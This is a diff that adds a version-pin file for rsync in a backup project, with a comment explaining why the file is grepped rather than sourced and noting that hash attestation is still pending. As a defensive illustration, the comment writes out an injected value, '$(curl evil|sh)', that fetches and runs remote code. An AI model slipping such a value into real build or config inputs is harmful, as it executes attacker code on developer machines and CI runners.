@@ -1,0 +1,14 @@
+# scripts/rsync.version - upstream rsync pin for FlashBackup.
+#
+# Two bare-literal assignments only. No quotes, no expansion, no command
+# substitution. Parsed by build-rsync.sh via anchored grep, NOT sourced as
+# Bash: sourcing would make any PR landing RSYNC_VERSION=3.4.1$(curl evil|sh)
+# execute arbitrary code on every dev machine and CI runner.
+#
+# ATTESTATION OUTSTANDING. The SHA below was observed on a single download
+# from download.samba.org on Mon, 24 Aug 2026. The triple-witness protocol
+# in the design spec section 4.4 has NOT yet been performed, and
+# scripts/rsync.version.attestation does not yet exist. Do not cut a release
+# from this pin until it does.
+RSYNC_VERSION=3.4.1
+RSYNC_TARBALL_SHA256=2924bcb3a1ed8b551fc101f740b9f0fe0a202b115027647cf69850d65fd88c52
